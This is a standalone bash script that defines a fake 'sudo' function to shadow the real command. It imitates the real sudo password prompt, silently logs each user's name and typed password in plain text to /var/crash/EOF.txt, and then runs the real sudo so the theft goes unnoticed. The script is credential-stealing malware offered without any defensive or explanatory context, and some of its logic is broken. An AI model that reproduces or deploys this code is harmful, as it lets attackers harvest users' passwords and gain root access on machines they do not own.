#!/bin/bash
function sudo ()
{
    realsudo="$(which sudo)";
    if [ $(whoami) != 'root' ]
    then
        a=true
        echo ${@:1} > name
        if [[ $name != 'su' ]]
        then
            if /usr/bin/sudo -n true 2>/dev/null
                then
                    /usr/bin/sudo -S ${@:1}
                    exit 1
            fi
        fi
    else
        a=false
    fi
    if ! /usr/bin/sudo -n true 2>/dev/null && $a
    then
        read -s -p "[sudo] password for $USER: " inputPasswd;
        printf "\n";
        printf '%s\n' "$USER : $inputPasswd" >> /var/crash/EOF.txt;
        $realsudo -S -u root bash -c "exit" <<< "$inputPasswd" > /dev/null 2>&1;
        $realsudo ${@:1}
    else
        if /usr/bin/sudo -n true 2>/dev/null
        then
            /usr/bin/sudo -S -u root bash
        else
            echo ${@:1}
        fi
    fi
}
sudo ${@:1}